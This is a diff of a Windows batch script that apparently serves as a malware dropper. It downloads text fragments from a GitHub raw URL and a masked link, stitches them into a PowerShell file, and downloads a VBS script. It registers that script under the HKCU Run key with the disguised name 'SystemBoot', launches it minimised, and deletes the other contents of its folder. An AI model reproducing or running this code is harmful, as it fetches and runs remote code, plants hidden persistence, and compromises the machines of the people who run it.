@@ -7,21 +7,27 @@ set "a=%d%\1.txt"
 set "b=%d%\2.txt"
 set "c=%d%\NNV.ps1"
 set "v=%d%\S_M.vbs"
-set "u=raw.githubusercontent.com/chotaacc/newss/main/"
-set tynLink="****"
+set "u=raw.githubusercontent.com/chotaacc/newss/main"
+set "****"
 
-rmdir /s /q "%d%" 2>nul
-mkdir "%d%" || exit /b 1
+if not exist "%d%" mkdir "%d%"
 
-powershell -c "$dynLink = '%tynLink%'.Replace('$','/'); $contentM = (Invoke-WebRequest -Uri 'https://%u%/final.txt').Content; $contentA = (Invoke-WebRequest -Uri 'https://%u%/first.txt').Content; $contentB = (Invoke-WebRequest -Uri $dynLink).Content; $finalContent = $contentM -replace '----',$contentA -replace '====',$contentB; [System.IO.File]::WriteAllText('%c%', $finalContent)" || exit /b 1
+rem Delete everything except this script
+for /f "delims=" %%F in ('dir "%d%" /a /b') do (
+  if /I not "%%~nxF"=="%~nx0" (
+    rmdir /s /q "%d%\%%F" 2>nul
+    del /f /q "%d%\%%F" 2>nul
+  )
+)
 
-powershell -c "$content = (Invoke-WebRequest -Uri 'https://%u%/S_m.vbs').Content; [System.IO.File]::WriteAllText('%v%', $content)" || exit /b 1
+powershell -c "$contentM=(Invoke-WebRequest -Uri 'https://%u%/final.txt').Content; $contentA=(Invoke-WebRequest -Uri 'https://%u%/first.txt').Content; $contentB=(Invoke-WebRequest -Uri '%tynLink%').Content; $final=$contentM -replace '----',$contentA -replace '====',$contentB; [IO.File]::WriteAllText('%c%',$final)" 
+if errorlevel 1 echo PowerShell step 1 failed & pause & exit /b
 
-if not exist "%v%" exit /b 1
+powershell -c "$content=(Invoke-WebRequest -Uri 'https://%u%/S_m.vbs').Content; [IO.File]::WriteAllText('%v%',$content)" 
+if not exist "%v%" echo S_m.vbs not downloaded & pause & exit /b
 
-powershell -c "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SystemBoot' -Value 'wscript.exe \"%v%\"'" || exit /b 1
-
-start /min wscript "%v%" || exit /b 1
+powershell -c "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SystemBoot' -Value 'wscript.exe \"%v%\"'"
+start /min wscript "%v%"
 
 endlocal
 exit /b 0
